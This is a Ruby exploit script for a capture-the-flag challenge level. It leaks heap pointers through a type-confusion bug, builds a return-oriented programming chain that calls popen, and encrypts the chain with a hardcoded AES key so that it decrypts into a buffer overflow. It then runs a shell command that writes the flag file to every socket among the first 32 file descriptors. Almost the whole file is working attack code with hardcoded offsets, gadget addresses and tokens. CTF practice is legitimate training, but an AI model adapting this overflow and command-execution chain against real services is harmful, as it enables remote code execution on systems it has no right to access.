# encoding: ASCII-8bit

require 'openssl'
require 'base64'
require 'socket'
require 'pp'
require 'openssl'

require './libronsolve.rb'
require './libgetout'

POP_EDI_RET = 0x401cbb
POP_ESI_POP_R15_RET = 0x401cb9
POPEN_ADDRESS = 0x4011e0

RETURN_OFFSET = 568

# Just try the first 32 sockets, why not?
CMD = 0.upto(32).map do |i|
  "cat /ctf/level3-flag.txt >&#{i}"
end.join(';')

OPCODE_INSTRUCTIONS = 100
OPCODE_IDENTIFY = 101
OPCODE_APPLY = 102
OPCODE_CHECK_STATUS = 103

TOKEN = "48756d61-6e73-2061-7265-207461737479"

KEY = "\xa6\x8b\x2a\x1c\x48\x0c\xac\x26\x24\x43\xab\xf9\x98\xa8\x1f\x2b"
IV = "\x4a\x3b\x9f\x46\x33\x0b\x76\x4f\x69\x0c\x99\xc6\x62\x6f\xb9\x35"

def get_encrypted_string(offset, data)
  padding = 0x41.chr * offset

  cipher = OpenSSL::Cipher.new('AES-128-CBC')
  cipher.decrypt
  cipher.padding = 0
  cipher.key = KEY
  cipher.iv = IV

  str = padding + data
  while(str.length % 16 != 0)
    str.concat("\0")
  end

  return cipher.update(str) + cipher.final()
end

def try_decrypt(data)
  cipher = OpenSSL::Cipher.new('AES-128-CBC')
  cipher.decrypt
  cipher.key = KEY
  cipher.iv = IV

  return cipher.update(data) + cipher.final()
end

def send_recv(s, expected, msg)
  s.write(msg)

  out = read_message(s)
  if out.shift[:value] != expected
    throw "Something went wrong: #{ out.to_s }"
  end

  return out
end

begin
  s = connect(*get_host_port())

  out = use(s, 'apply')

  puts "*** Intro text: #{ out }"

  # *** Get instructions
  puts "*** Testing OPCODE_INSTRUCTIONS..."
  out = send_recv(s, 0, create_message([
    { type: :integer, value: OPCODE_INSTRUCTIONS },
  ]))
  puts "Fetched instructions successfully!"
  puts

  # *** Identify with a bad token
  puts "* Identifying with an invalid token..."
  out = send_recv(s, 31007, create_message([
    { type: :integer, value: OPCODE_IDENTIFY },
    { type: :string, value: "abcd" },
  ]))
  puts "Failed correctly!"
  puts

  # Apply without identifying first
  puts "* Applying without identifying (should fail)"
  out = send_recv(s, 31002, create_message([
    { type: :integer, value: OPCODE_APPLY },
    { type: :string, value: 'hi1' },
    { type: :string, value: 'hi2' },
    { type: :string, value: 'hi3' },
    { type: :string, value: 'hi4' },
    { type: :string, value: 'hi5' },
  ]))
  puts "Failed successfully!"

  # *** Identify
  puts "* Identifying with the token from last level..."
  out = send_recv(s, 0, create_message([
    { type: :integer, value: OPCODE_IDENTIFY },
    { type: :string, value: TOKEN },
  ]))
  puts "Identified successfully!"
  puts

  # Apply (correctly)
  puts "* Making sure OPCODE_APPLY works..."
  out = send_recv(s, 0, create_message([
    { type: :integer, value: OPCODE_APPLY },
    { type: :string, value: 'hi1' },
    { type: :string, value: 'hi2' },
    { type: :string, value: 'hi3' },
    { type: :string, value: 'hi4' },
    { type: :string, value: 'hi5' },
  ]))
  TEST_APPLY_RESULT = out[0][:value]
  puts "Apply seems to work! We got this token: #{ TEST_APPLY_RESULT.unpack('H*') }"
  puts "Decrypts to: #{ try_decrypt(TEST_APPLY_RESULT) }"
  puts

  # Send it back to see if it works
  puts "* Making sure OPCODE_CHECK_STATUS works..."
  out = send_recv(s, 0, create_message([
    { type: :integer, value: OPCODE_CHECK_STATUS },
    { type: :binary, value: TEST_APPLY_RESULT },
  ]))
  puts "Looks good!"
  puts

  # Get the command string, using a bad opcode + type confusion
  puts "* Getting a pointer to the command string..."
  out = send_recv(s, 31002, create_message([
    { type: :string, value: CMD },
  ]))
  CMD_ADDRESS = out[0][:value].split(/ /).pop.to_i
  puts "0x%x => \"#{ CMD }\"" % CMD_ADDRESS
  puts

  # Get a pointer to the string "r"
  puts "* Getting a pointer to the string \"r\"..."
  out = send_recv(s, 31002, create_message([
    { type: :string, value: 'r' },
  ]))
  R_ADDRESS = out[0][:value].split(/ /).pop.to_i
  puts "0x%x => \"r\"" % R_ADDRESS
  puts

  encrypted_payload = nil
  loop do
    puts "* Generating a ROP Chain..."
    rop = [
      POP_EDI_RET,
      CMD_ADDRESS,
      POP_ESI_POP_R15_RET,
      R_ADDRESS,
      rand(0..0xffffffffffffffff),
      POPEN_ADDRESS,
      rand(0..0xffffffffffffffff),
    ].pack('QQQQQQQ')
    puts " => #{ rop.unpack('H*') }"
    puts

    puts "* Encrypting the ROP chain with padding..."
    encrypted_payload = get_encrypted_string(RETURN_OFFSET, rop)
    puts " => #{ encrypted_payload.unpack('H*') }"

    if !encrypted_payload.include?("\0")
      break
    end

    puts "* Our payload contained a NUL byte! Trying again with random values..."
  end

  # Apply
  puts "* Sending the overflow..."
  puts
  parts = encrypted_payload.unpack('a200a200a200a200a200')
  send_recv(s, 0, create_message([
    { type: :integer, value: OPCODE_APPLY },
    { type: :string, value: parts[0] || 'hi' },
    { type: :string, value: parts[1] || 'hi' },
    { type: :string, value: parts[2] || 'hi' },
    { type: :string, value: parts[3] || 'hi' },
    { type: :string, value: parts[4] || 'hi' },
  ]))

  puts "* Trying to read the flag from the socket..."

  check_flag(s.recv(10000), terminate: true)
ensure
  s.close if s
end
